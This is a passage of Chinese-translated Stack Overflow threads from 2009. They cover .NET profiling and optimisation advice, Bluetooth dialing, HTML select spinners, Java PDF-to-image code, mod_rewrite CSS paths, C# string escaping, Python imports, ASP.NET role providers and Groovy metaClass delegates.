换句话说，你得到了一个很大的调用树，你只需要寻找大数字。通常，很少有函数消耗超过 10% 的执行时间。所以找到这些，你就知道要优化*什么了。*

请注意，分析器既不是必需的，也不是*最好*的方法。一个非常简单但有效的方法是在调试器中运行程序，然后在几个准随机时间暂停执行并查看调用堆栈。只做几次，你就会非常清楚你的执行时间花在了哪里。在此答案下发表评论的@Mike Dunlavey 在其他地方深入描述了这种方法。

但是既然您知道执行时间花在了哪里，那么棘手的部分就来了，*如何*优化代码。

当然，最有效的方法往往是高级方法。问题一定要这样解决吗？它必须解决吗？是否可以提前解决并缓存结果，以便在应用程序的其余部分需要时立即交付？是否有更有效的算法来解决问题？

如果您可以应用此类高级优化，请执行此操作，看看是否充分提高了性能，如果没有，请再次分析。

迟早，您可能不得不深入研究更底层的优化。不过，这是一个棘手的领域。今天的计算机非常复杂，您从中获得的性能并不简单。分支或函数调用的成本可能因上下文而异。将两个数字相加可能需要 0 到 100 个时钟周期，具体取决于这两个值是否已经在 CPU 的寄存器中、当时正在执行的其他内容以及许多其他因素*。*因此，此级别的优化需要 (1) 充分了解 CPU 的工作原理，以及 (2) 大量的实验和测量。您可以轻松地做出您*认为*会更快的更改，但您需要确定，因此要衡量更改前后的性能。

有一些一般的经验法则通常可以帮助指导优化：

I/O 很昂贵。CPU 指令以几分之一纳秒为单位进行测量。RAM 访问大约为几十到几百纳秒。访问硬盘驱动器可能需要几十*毫秒*。很多时候，I/O 会拖慢你的应用程序。您的应用程序是执行少量大型 I/O 读取（读取一个大块中的 20MB 文件），还是执行无数小型读取（从一个文件读取字节 2,052 到 2073，然后从另一个文件读取几个字节）？更少的大读取可以将您的 I/O 速度提高数千倍。

页面错误也涉及硬盘访问。内存中的页面必须被推送到页面文件，而分页的页面必须被读回内存。如果这种情况经常发生，它会很慢。您能否改善数据的局部性，从而减少同时需要的页面？您是否可以简单地为主机购买更多 RAM 以避免不得不分页数据？（作为一般规则，硬件很便宜。升级计算机是一个完全有效的优化 - 但要确保升级会有所作为。购买更快的计算机不会加快磁盘读取速度。如果一切都适合 RAM在您的旧系统上，购买具有 8 倍 RAM 的系统毫无意义）

您的数据库也依赖于硬盘访问。那么，您可以在 RAM 中缓存更多数据，并且只是偶尔将其写入数据库吗？（当然有风险。如果应用程序崩溃了怎么办？

然后是每个人都喜欢的线程。现代 CPU 有 2 到 16 个 CPU 内核可用。你都在用吗？你会从使用它们中受益吗？是否有可以异步执行的长时间运行的操作？应用程序在单独的线程中启动操作，然后能够立即恢复正常操作，而不是阻塞直到操作完成。

所以基本上，使用分析器来了解您的应用程序。它如何花费它的执行时间，它在哪里花费？内存消耗有问题吗？什么是 I/O 模式（硬盘和网络访问，以及任何其他类型的 I/O）？CPU 是一直在不停地运转，还是空闲等待一些外部事件，例如 I/O 或计时器？

然后尽可能多地了解运行它的计算机。了解它有哪些可用资源（CPU 缓存、多核），以及它们各自对性能的意义。

这一切都非常模糊，因为优化大型数据库服务器的技巧将与优化一些大型数字处理算法的技巧大不相同*。*

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T01:29:12.967

我正在上一门本科课程（一个主题是性能分析），推荐的文本是[计算机系统性能分析的艺术：实验设计、测量、模拟和建模技术](https://rads.stackoverflow.com/amzn/click/com/0471503363)。这是关于这个主题的圣经，可能有点矫枉过正。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-15T01:20:59.650

如果您熟悉并已经购买了 ANTS（一个非常好的分析器），那么请前往[此处](http://www.red-gate.com/Products/ants_profiler/walkthrough.htm)获取快速教程以帮助您启动和运行。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-21T21:18:01.817

如果你有 Visual Studio Team System，我建议使用它包含的 Profiler。
它在“Analyze->Profiler”下
使用这个分析器非常简单。你可以潜入其中，看看你是怎么做的。动手实践比您将要阅读的任何文章或书籍都要好。

只需单击几下，即可轻松找到前几个瓶颈。解决它们可能有点棘手，但同样，优化代码只是一个问题或实践和经验。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T15:17:32.357

这两篇文章是我到目前为止发现的全部内容：

[使用 Visual Studio Profiler 查找应用程序瓶颈](http://msdn.microsoft.com/en-us/magazine/cc337887.aspx)

[测量 .NET 应用程序性能](http://msdn.microsoft.com/en-us/library/ms998579.aspx)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-22T16:28:46.823

阅读[Rico Mariani 的博客](http://blogs.msdn.com/ricom/)。在升职之前，他是 .Net 的主要性能调整人员。他博客中较早的条目有很多很好的建议。我会从头开始，按照你的方式前进。

再加上您已经找到的文章（尤其是[第一](http://msdn.microsoft.com/en-us/magazine/cc337887.aspx)篇）应该可以帮助您入门。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-22T18:37:42.943

有分析器和性能分析工具，但是当你试图找到/购买/安装/学习一个时，试试老前辈的把戏......

在 IDE 下运行应用程序，当它运行缓慢时，点击“暂停”按钮，并询问它在做什么，以及**为什么**。回答这个问题的最好方法是阅读调用堆栈。

如果它比应有的速度慢几倍，比如 10 倍，这意味着它花费了 90% 的时间在做一些不必要的事情，**这就是你会抓住它做这件事的概率**。如果您多次重复此操作，您可以尽可能准确地确认您的怀疑。

所以你不需要昂贵/流行但模糊的放大镜。

所以找到缓慢的原因并不是难点，通常有几个。

困难的部分是，在你修复了一些“低垂的果实”之后，你可能不得不面对这样一个事实，即设计缓慢的主要原因是过度设计。

祝你好运。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-24T00:16:18.097

我以前使用过分析器，它们可能会有所帮助，但是您可以通过创建一个单例秒表类型类并“单击”它来获得很多帮助（让它打印出自上次单击以来的时间以及刚刚完成的操作花了那个时间）在您认为可能有问题的方法之前和之后。

如果速度是整个应用程序的问题，您可能无法对此做太多事情，但您可能可以进行一些更改......

寻找内循环。这些都是性能死亡。内部循环可能是由一些简单的事情引起的，比如对链表进行索引，或者对基于数组的列表进行插入排序。（曾经我有一个列表框需要 10 到 20 分钟才能填充数万个条目，尽管条目太多，但最糟糕的是它通过将每个条目插入数组列表来对其进行排序）。

查找基于按键进行长时间操作的情况。这些几乎总是应该在主线程之外完成。

甚至不要考虑优化类的数量或实例化的频率、字符串连接（循环外）、清除变量或任何其他看起来应该有帮助的愚蠢策略。我已经尝试了一些，但当我真正放慢速度时总是觉得很傻，因为我没有运行时那么聪明。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-02-25T22:54:18.060

我会下载一些可用的分析工具（免费试用）并开始使用它们。

我用[了 jetbrains](http://www.jetbrains.com/profiler/)，还有其他的。（[例如蚂蚁](http://www.red-gate.com/products/ants_profiler/performance_profiling_reinvented_timeline.htm?gclid=CMLLgOfg-JgCFQEpGgodJzJimg)、[devpartner](http://www.compuware.com/products/devpartner/default.htm)和[MS one？](http://www.microsoft.com/downloads/details.aspx?FamilyId=86CE6052-D7F4-4AEB-9B7A-94635BEEBDDA&displaylang=en)、[atomatedqa](http://www.automatedqa.com/products/aqtime/)等）运行它们应该不会有太多问题。他们的报告可以为您提供大量信息，您只需使用这些应用程序即可快速学习。

其中任何一个都可能对您有所帮助，并且很高兴使用这些试验。然后，您可以搁置购买该工具的决定，或者购买最有用/最容易使用的工具。一般来说，它们可以节省大量时间并且物有所值，尽管有些可能很昂贵。（当有非常好的工具可以花更少的钱时，我很难与高端的人相处）

在安装和运行它们的第一天，您可能会发现一些严重/主要的性能问题。我知道我做到了。

祝你好运。

只需下载一些工具并开始运行您的应用程序。

编辑：

至于书籍和学习——基本上了解代码问题的最佳方法是找到糟糕的代码。多次与经验丰富的开发人员进行检查会有所帮助。

举个例子：我认为乔尔早前曾写过一篇关于他做过类似的事情的文章

for (int i = 0; i < strlen(一些字符串); i++)

很明显，您将在循环的每次迭代中调用 strlen （昂贵的）。

在分析器告诉您时间花费在哪里之后，您必须查看一些代码，看看代码是否可以通过简单的事情轻松修复，或者必须在算法设计中进行更改。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-22T16:50:56.023

这对 C# 帮助不大，但 OS X Shark 工具（随 Apple 开发人员工具提供）是我遇到的最好的分析工具。使用起来几乎很有趣！

至于剖析，有两种方法。首先，您应该*了解*该软件。尤其是数据结构。除非您先了解它，否则不要开始优化。

其次，你应该*测量*（这似乎是你即将做的）。我几乎总是被我的直觉误导。我认为次要的地方是耗时的。这也意味着当您进行优化时，您总是针对您运行的特定测试用例集进行优化。这种情况的选择很重要。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-26T19:47:30.603

您已经使用 Profiler 击中了头部的钉子。所有这些，至少我使用过的所有，都遵循相同的基本方法。您选择可执行文件，然后运行该应用程序。

您对输出所做的事情是找到花费最多时间的方法。l 这还不是全部，但您需要一种学习如何优化代码的好方法，因此长时间运行的例程是一个很好的起点。您提到的 ANTS 将默认显示长时间运行的例程，大多数（如果不是全部）其他例程也是如此。

你可以排除容器方法，比如 Main()，除非你有很多代码（不太可能）。

总的来说，我发现在三个方面浪费最多：

1.  循环
2.  递归
3.  网络延迟

区域#3，对于数据库，如果您还要分析您的数据库，通常很容易发现，因为您会看到点击次数。减少网络延迟的最佳方法，无论是否是数据库（例如服务调用），都是通过消息而不是 CRUD 进行通信。不要查询每个表，一次一个。不幸的是，该解决方案通常需要封装许多常见数据层的一部分。

递归和循环是非常相似的问题。如果您想物有所值，请先打内循环。

在 .NET 中，您还可以通过学习基本 IL 并通过 Reflector 等工具检查应用程序的 IL 来了解很多关于优化的知识。有点浪费时间，如果这不是你工作描述的主要部分，或者你可能想要在未来的职业生涯中做的事情。作为一名消防员的薪水很高，但作为一名只做维护的编码员可能会很无聊。

关于优化和分析 .NET 应用程序的书籍只有几本。在标题中进行了优化的那个。.NET 的调试书有一些关于 Profiling 的信息，但不是很深。然而，这是一本用于优化的好书，因为许多导致错误的问题也会出现在您的优化之旅中。

# api - 通过蓝牙拨打电话号码

> ID：550117
> 
> 赞同：0
> 
> 时间：2009-02-15T01:26:33.037
> 
> 标签：api, mobile, bluetooth, dialing

我想在 Win/Mac/*nix 下编写一个程序，它需要一个电话号码并通过蓝牙在我的手机上拨打它。我对BT了解不多。那可能吗？手机是我的，我想让它拨号。我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T01:33:41.210

您可能想要获取您的手机制造商的 AT 命令集手册。然后，您需要通过蓝牙打开串行连接（OS X：与手机连接，应该会出现 /dev/tty.nameofyourphone）。您可以像使用普通调制解调器一样与手机通话，并按照文档中的说明发送命令。

# javascript - 带有向上/向下箭头的单行选择框，如多行选择框

> ID：550121
> 
> 赞同：0
> 
> 时间：2009-02-15T01:28:29.727
> 
> 标签：javascript, html, css, forms

基本上，我想要这个：

```
<select size="2">
  <option>1</option>
  <option>2</option>
  <option>3</option>
  <option>4</option>
</select> 
```

但不是有两条线，我希望它在一条线上。这可以在没有 Javascript 的情况下完成吗？

如果不是，我想这是很常见的（尽管我在 Google 上找不到任何相关链接）存在一个标准的跨浏览器解决方案，这将是有帮助的。

编辑：该控件也称为[步进器](http://developer.apple.com/documentation/UserExperience/Conceptual/AppleHIGuidelines/XHIGControls/chapter_19_section_4.html#//apple_ref/doc/uid/TP30000359-TPXREF204)或[微调器](http://msdn.microsoft.com/en-us/library/aa511491.aspx)（此链接还包含有关何时使用旋转控件的 UI 指南）

# 解决方案 A：

```
<select size="2" style="height:40px; font-size:28px;">
  <option>1</option>
  <option>2</option>
  <option>3</option>
  <option>4</option>
  <option>5</option>
  <option>6</option>
</select> 
```

此解决方案依赖于这样一个事实，即选择框足够大以启用控件，但文本足够大，以便仅显示一行文本。问题是它需要相当大才能起作用。它适用于 IE/FF，但由于浏览器默认文本大小的差异，它仍然不稳定。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T01:38:35.473

在努力寻找可行的无 JavaScript 解决方案之前，您可能需要重新考虑用户交互方面。

当用户看到单行`<select>`时，默认行为是显示下拉列表。更改此设置违背了用户的期望，并且可能使您的表单更难使用，最终降低完成度或至少增加使用它的时间。

如果您最终希望允许多项选择，那么几乎不可能使用单行输入。

除非您有合理的反馈表明用户希望下拉列表的行为有所不同，否则您可能会朝着错误的方向前进，至少从用户体验的角度来看是这样。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T01:47:27.027

如果您*可以*使用 JavaScript，看起来[微调器控件有一些选项](http://www.google.com/search?hl=en&q=javascript+spinner)。[一种这样的控件](http://extjs.com/learn/Extension:Ext.ux.form.Spinner)具有非常好的 UI 和功能。例子：

[![替代文字](https://i.stack.imgur.com/jYTjD.jpg)](https://i.stack.imgur.com/jYTjD.jpg)
[（来源：[extjs.com](http://extjs.com/learn/w/images/a/ae/Ux-form-spinner.jpg)）]

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T01:32:28.997

试试这个。

```
<select size="2" style="height:2em;">
   <option>1</option>
   <option>2</option>
   <option>3</option>
   <option>4</option>
   <option>5</option>
   <option>6</option>
</select> 
```

顺便说一句，我同意马克

# java - 将 PDF 页面导出为 Java 中的一系列图像

> ID：550129
> 
> 赞同：9
> 
> 时间：2009-02-15T01:38:01.700
> 
> 标签：java, image, pdf, export

我需要将任意 PDF 文档的页面导出为 jpeg/png/etc 格式的一系列单个图像。我需要在 Java 中执行此操作。

尽管我确实了解 iText、PDFBox 和各种其他 java pdf 库，但我希望能找到一些工作示例或操作方法的指针。

谢谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-15T02:07:52.313

这是一种方法，它结合了来自网络的一些代码片段。

**如何将 PDF 绘制成图像？**

[https://pdf-renderer.dev.java.net/examples.html](http://java.net/projects/pdf-renderer)

**从图像创建缓冲图像**

原文：[http ://www.exampledepot.com/egs/java.awt.image/Image2Buf.html](http://www.exampledepot.com/egs/java.awt.image/Image2Buf.html)

更新：[如何将缓冲图像转换为图像，反之亦然？](https://stackoverflow.com/questions/9132149/how-to-convert-buffered-image-to-image-and-vice-versa)

**将生成的图形保存为 PNG 或 JPEG 文件**

原文：[http ://www.exampledepot.com/egs/javax.imageio/Graphic2File.html](http://www.exampledepot.com/egs/javax.imageio/Graphic2File.html)

更新：http : [//docs.oracle.com/javase/tutorial/2d/images/saveimage.html](http://docs.oracle.com/javase/tutorial/2d/images/saveimage.html)

组合在一起就像这样将所有页面变成图像：

```
import com.sun.pdfview.PDFFile;
import com.sun.pdfview.PDFPage;

import java.awt.Graphics;
import java.awt.GraphicsConfiguration;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.HeadlessException;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Transparency;
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import javax.swing.*;
import javax.imageio.*;
import java.awt.image.*;

public class ImageMain {
    public static void setup() throws IOException {
        // load a pdf from a byte buffer
        File file = new File("test.pdf");
        RandomAccessFile raf = new RandomAccessFile(file, "r");
        FileChannel channel = raf.getChannel();
        ByteBuffer buf = channel.map(FileChannel.MapMode.READ_ONLY, 0, channel.size());
        PDFFile pdffile = new PDFFile(buf);
        int numPgs = pdffile.getNumPages();
        for (int i = 0; i < numPgs; i++) {
            // draw the first page to an image
            PDFPage page = pdffile.getPage(i);
            // get the width and height for the doc at the default zoom
            Rectangle rect = new Rectangle(0, 0, (int) page.getBBox().getWidth(), (int) page.getBBox().getHeight());
            // generate the image
            Image img = page.getImage(rect.width, rect.height, // width & height
                    rect, // clip rect
                    null, // null for the ImageObserver
                    true, // fill background with white
                    true // block until drawing is done
                    );
            // save it as a file
            BufferedImage bImg = toBufferedImage(img);
            File yourImageFile = new File("page_" + i + ".png");
            ImageIO.write(bImg, "png", yourImageFile);
        }
    }

    // This method returns a buffered image with the contents of an image
    public static BufferedImage toBufferedImage(Image image) {
        if (image instanceof BufferedImage) {
            return (BufferedImage) image;
        }
        // This code ensures that all the pixels in the image are loaded
        image = new ImageIcon(image).getImage();
        // Determine if the image has transparent pixels; for this method's
        // implementation, see e661 Determining If an Image Has Transparent
        // Pixels
        boolean hasAlpha = hasAlpha(image);
        // Create a buffered image with a format that's compatible with the
        // screen
        BufferedImage bimage = null;
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        try {
            // Determine the type of transparency of the new buffered image
            int transparency = Transparency.OPAQUE;
            if (hasAlpha) {
                transparency = Transparency.BITMASK;
            }
            // Create the buffered image
            GraphicsDevice gs = ge.getDefaultScreenDevice();
            GraphicsConfiguration gc = gs.getDefaultConfiguration();
            bimage = gc.createCompatibleImage(image.getWidth(null), image.getHeight(null), transparency);
        } catch (HeadlessException e) {
            // The system does not have a screen
        }
        if (bimage == null) {
            // Create a buffered image using the default color model
            int type = BufferedImage.TYPE_INT_RGB;
            if (hasAlpha) {
                type = BufferedImage.TYPE_INT_ARGB;
            }
            bimage = new BufferedImage(image.getWidth(null), image.getHeight(null), type);
        }
        // Copy image to buffered image
        Graphics g = bimage.createGraphics();
        // Paint the image onto the buffered image
        g.drawImage(image, 0, 0, null);
        g.dispose();
        return bimage;
    }

    public static boolean hasAlpha(Image image) {
        // If buffered image, the color model is readily available
        if (image instanceof BufferedImage) {
            BufferedImage bimage = (BufferedImage) image;
            return bimage.getColorModel().hasAlpha();
        }
        // Use a pixel grabber to retrieve the image's color model;
        // grabbing a single pixel is usually sufficient
        PixelGrabber pg = new PixelGrabber(image, 0, 0, 1, 1, false);
        try {
            pg.grabPixels();
        } catch (InterruptedException e) {
        }
        // Get the image's color model
        ColorModel cm = pg.getColorModel();
        return cm.hasAlpha();
    }

    public static void main(final String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                try {
                    ImageMain.setup();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-19T20:13:03.597

如果您考虑 JPedal PDF 库，它是内置的，并在[https://support.idrsolutions.com/hc/en-us/articles/115001978091-Convert-PDF-Files-to-Image上附有示例源文件](https://support.idrsolutions.com/hc/en-us/articles/115001978091-Convert-PDF-Files-to-Image)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-17T14:44:27.200

如果您发现 sun 渲染器不适用于您的所有 PDF 文档，您可以考虑使用 jPDFImages。

为了提高效率，您应该将每个 PDF 页面转换为缓冲图像，然后从那里转换为您需要的各种图像格式。这将避免必须从 PDF 转换为每种格式的图像。

这是使用 jPDFImages 从 PDF 转换为缓冲图像的链接：http: [//kbdeveloper.qoppa.com/jpdfimages/codesampleconvertpdfpageintobufferedimageinjava](http://kbdeveloper.qoppa.com/jpdfimages/codesampleconvertpdfpageintobufferedimageinjava)

对于每个页面图像，您可以简单地导出为不同的图像格式： ImageIO.write(pageBufferedImage, "JPEG", outputFile); ImageIO.write(pageBufferedImage, "PNG", outputFile); ETC...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T09:35:42.920

有不同的库可以做到这一点。我已经用[PDFBox](http://pdfbox.apache.org/commandlineutilities/PDFToImage.html)实现了这一点。但在我看来，最有效的解决方案是使用[ghostscript](http://www.ghostscript.com/doc/current/Use.htm)。但是，如果您认为需要一个简单的解决方案，请使用[ImageMagick](http://www.imagemagick.org/script/index.php)。但是 ImageMagick 在内部调用了 ghostscript。使用 ghostscript 或 imagemagick 可以为您提供更好的解决方案。它比任何其他库都快得多。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-10-24T17:01:36.337

PDF 到位图（Android 兼容代码）

```
File pdfFile = new File(filePath);
PdfRenderer renderer = new PdfRenderer(ParcelFileDescriptor.open(pdfFile, ParcelFileDescriptor.MODE_READ_ONLY));

final int pageCount = renderer.getPageCount();
//Currently for a page, iterate for all the pages
PdfRenderer.Page page = renderer.openPage(pageCount);
int width =  page.getWidth();
int height = page.getHeight();

Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888); 
```

[位图到 PNG（或任何其他格式）](https://stackoverflow.com/questions/20656649/how-to-convert-bitmap-to-png-and-then-to-base64-in-android)

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2010-09-27T12:09:31.600

只需从 1 而不是 0 开始 for 循环。您的问题将得到解决。

# css - mod_rewrite 和 CSS

> ID：550135
> 
> 赞同：2
> 
> 时间：2009-02-15T01:44:39.997
> 
> 标签：css, mod-rewrite

我正在使用 mod_rewrite 更改站点上的所有 URL。示例：`http://www.site.com/about/`变成`http://www.site.com/?action=about`（别担心，我有很好的友好理智检查）。问题是除了 CSS 样式表之外`http://www.site.com/`的任何东西都不会加载。我认为这是因为它查找样式表`/about/content/style.css`而不是`/content/style.css`. 如何确保它找到正确的样式表？

这是我的一些代码以防万一。`.htaccess`看起来像这样：

```
RewriteEngine on
RewriteRule ^news/([0-9]+)/?$ /?action=news&start=$1 [L]
RewriteRule ^news/?$ /?action=news&start=0 [L]
RewriteRule ^(about|contact|man|home|download)/?$ /?action=$1 [L] 
```

他们都重定向到`index.php`，开始是这样的：

```
<html>
  <head>
    ...
    <link rel="stylesheet" href="content/style.css" type="text/css" />
  </head>
  <body>
    ...
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T01:46:07.687

试试这个。

```
<link rel="stylesheet" href="/content/style.css" type="text/css" /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T01:47:07.403

为什么不对 CSS 文件使用绝对 URI？即/content/style.css。节省这样的头痛。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T11:01:27.260

另一种解决方案是使用`BASE`HTML 元素设置基本 URI：

```
<base href="/" /> 
```

因此，相对 URI 是从基本 URI 路径`/`而不是当前资源的 URI 路径（在您的情况下`/about/`）解析的。

# c# - 字符串 webPath = folderPath.Replace("\\", "/");

> ID：550143
> 
> 赞同：2
> 
> 时间：2009-02-15T01:47:43.127
> 
> 标签：c#, .net

```
string webPath = folderPath.Replace("\", "/"); 
```

嗨，我正在尝试替换上述内容，但正在苦苦挣扎。我需要对 / 应用转义序列吗？如果是这样，任何人都知道它在 c# 中是什么。非常感谢任何帮助/提示。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-15T01:50:07.817

```
string webPath = folderPath.Replace(@"\", "/"); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-15T02:07:07.043

```
string webPath = folderPath.Replace("\\", "/"); 
```

...也可以。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-15T01:49:29.440

```
string webPath = folderPath.Replace(@"\", "/"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T07:51:21.650

正如其他人所说，您必须转义 \ 而不是 /，并且您可以使用*逐字字符串文字*完全避免转义- 以 @ 为前缀的字符串文字允许多行字符串常量，并且不会转义任何字符除了 " 需要加倍。

有关转义序列的完整列表，请参阅我的（有点旧，但在这种情况下仍然准确）[C# FAQ](http://www.yoda.arachsys.com/csharp/faq/#escapes)。

# python - python 有类似 C++ 的 using 关键字吗？

> ID：550148
> 
> 赞同：10
> 
> 时间：2009-02-15T01:50:34.947
> 
> 标签：python, namespaces, using

在 C++ 中，您通常可以通过仔细使用“using”关键字来大幅提高代码的可读性，例如：

```
void foo()
{
    std::vector< std::map <int, std::string> > crazyVector;
    std::cout << crazyVector[0].begin()->first;
} 
```

变成

```
void foo()
{
    using namespace std; // limited in scope to foo
    vector< map <int, string> > crazyVector;
    cout << crazyVector[0].begin()->first;
} 
```

python是否存在类似的东西，还是我必须完全限定所有内容？

我将添加我知道 using 有其缺陷的免责声明，并且应适当限制其范围。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-15T01:58:04.147

正如比尔所说，Python 确实有结构

```
from X import * 
```

但您也可以明确指定要从模块（命名空间）导入的名称：

```
from X import foo, bar, blah 
```

这往往使代码更具可读性/更易于理解，因为在源代码中看到标识符的人不需要搜索所有导入的模块来查看它的来源。这是一个相关的问题：[Namespace Specification In Absence of Ambuguity](https://stackoverflow.com/questions/539578/namespace-specification-in-absence-of-ambuguity)

*编辑*：作为对 Pax 评论的回应，我会提到你也可以写类似的东西

```
import X.foo 
```

但是你需要写

```
X.foo.moo() 
```

而不仅仅是

```
foo.moo() 
```

当然，这不一定是坏事。我通常混合使用`from X import y`和`import X.y`形式，只要我觉得让我的代码最清晰。在某种程度上，这当然是一件主观的事情。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-15T01:56:14.977

当然，python 的活力使这变得微不足道。如果你有一个深埋在命名空间中的类：foo.bar.baz.blah，你可以这样做：

```
def foo:
    f = foo.bar.baz.blah
    f1 = f() 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-15T01:54:18.320

```
import X 
```

或者

```
from X import * 
```

或者

```
from X import a, b, c 
```

其中 X 是您要使用的 Python 模块。

给我们一个您认为需要清理的 Python 代码示例对您很有帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-01-06T07:35:28.173

除了大卫的回答：

1.  `from X import (foo, bar, blah)`为了[PEP8](http://www.python.org/dev/peps/pep-0008/)，应该使用圆括号。
2.  完整语法允许在当前模块范围内将包名称重命名（重新绑定）为其新标识符，如`from foo import bar as baz`.

[我建议查阅import 关键字](http://docs.python.org/reference/simple_stmts.html#import)的手册、**sys.modules**的`__import__`内置和解释作为进一步阅读。

 *** * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-11-15T13:51:15.553

Python 中的另一个选项是导入时的构造“as”。例如：

```
from foo import bar as baz 
```

这将`foo.bar`像`baz`在当前模块中一样引入，允许实体在当前模块中获得不同的名称，可能是为了避免在当前模块中隐藏具有相同名称的现有实体。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T05:23:17.197

注意

```
from foo import bar 
```

即使`bar`是`foo`包中的一个模块也可以工作。这使您可以限制命名空间污染，而不必命名`foo.bar`您可能希望使用的每个函数/类。它还可以帮助读者阅读您的代码，因为他们会看到调用`bar.baz()`并更好地了解`baz`来自哪里。

# asp.net - 如何允许用户将不同的站点功能分配给 asp.net 角色提供程序中的不同角色？

> ID：550150
> 
> 赞同：0
> 
> 时间：2009-02-15T01:51:01.620
> 
> 标签：asp.net, roleprovider

我正在争论是否要编写自己的身份验证类。几乎完成了，但我认为使用角色提供程序（自定义或默认）可能会更好。我知道您可以将用户分配给角色，然后根据当前角色向用户显示信息。但是，如果您想根据任务分配权限怎么办？例如，有时我希望编辑角色能够修改其他人的帖子，但有时我不这样做。这是一个简单的情况，但我希望获得更细粒度的授权，而不是拥有大量角色（编辑、编辑所有帖子等）。这是否可以使用自定义 asp.net 角色提供程序，或者我应该继续完成我自己的系统吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-08-27T12:50:35.850

基本的 ASP.NET 角色提供程序是平面结构的——因此用户需要属于他们所属的所有角色。

您将需要找到/[编写一个](http://msdn.microsoft.com/en-us/library/8fw7xh74.aspx)支持层次结构的角色提供程序 - 我会推荐这条完全不同的路线，因为您将从中获得一些好处，例如与这些提供程序一起使用的框架的其他方面（登录控件、配置授权/访问等设置）。

你真的想要这样的东西：

*   用户角色 - 可以发帖到论坛，可以编辑自己的帖子。
*   编辑角色 - 可以做任何用户可以做的事情，并且可以编辑其他帖子。
*   管理员角色 - 可以做任何编辑可以做的事情，以及其他管理事务。

因此，如果用户处于 Editor 角色，他们将自动获得用户权限，等等。

那么您的选择是：

1.  为每个论坛复制这些角色，将用户分配给他们等。
2.  将几个属性添加到您的用户配置文件中，例如“ForumEdit”和“ForumAdmin”，并在其中存储他们能够编辑/管理的论坛列表。

(1) 的优点是您只需要进行一次检查即可查看用户是否可以执行管理/编辑任务，但管理所有这些角色的开销更高。

(2) 的优点是易于管理角色，您可以从 editors 组中删除用户，例如，他们会失去所有编辑权限，但您需要更高的成本来确定他们是否真的是该组的编辑论坛，因为您需要查询他们的个人资料。

与此类似的答案[真的在这里](https://stackoverflow.com/questions/756299/how-can-i-implement-a-role-hierarchy-in-an-asp-net-mvc-app-using-activedirectorym/758469#758469)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-16T10:21:40.907

我不完全确定你的意思，如果你能澄清一下：

> 例如，有时我希望编辑角色能够修改其他人的帖子，但有时我不这样做。

您可以为用户分配多个角色。所以我会有一个基础角色，然后逐步添加功能

编辑版主管理员等

一个用户可以同时属于这三个。

# groovy - 如何从 Groovy 中的 MetaClass 方法引用 GroovyObject 实例？

> ID：550165
> 
> 赞同：14
> 
> 时间：2009-02-15T02:02:45.320
> 
> 标签：groovy, metaclass

这是我想要做的一个人为的例子，但最低限度地表达了所需的行为。我想引用正在调用属性访问的对象的实例。我首先尝试了“this”，但它指的是封闭类，而不是 MetaClass 或 String 实例。

```
String.metaClass.propertyMissing = { String name ->
    'I do not exist, but my name is ' + <the String instance> + '.' + $name
} 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-15T10:21:47.217

您可以使用“委托”来引用对象：

```
String.metaClass.propertyMissing = { String name ->
    "I do not exist, but my name is $delegate.$name"
}

println "a".me 
```

# c# - C# 中的 ASP.NET Web 应用程序使用哪个 express 版本？

> ID：550166
> 
> 赞同：1
> 
> 时间：2009-02-15T02:03:19.203
> 
> 标签：c#, .net, asp.net

哪个 Express 版本最适合在 C# 中启动 ASP.NET Web 应用程序？我想 Visual Web Developer Express 就是为此而设计的，但是 Visual C# Express 呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T02:13:25.843

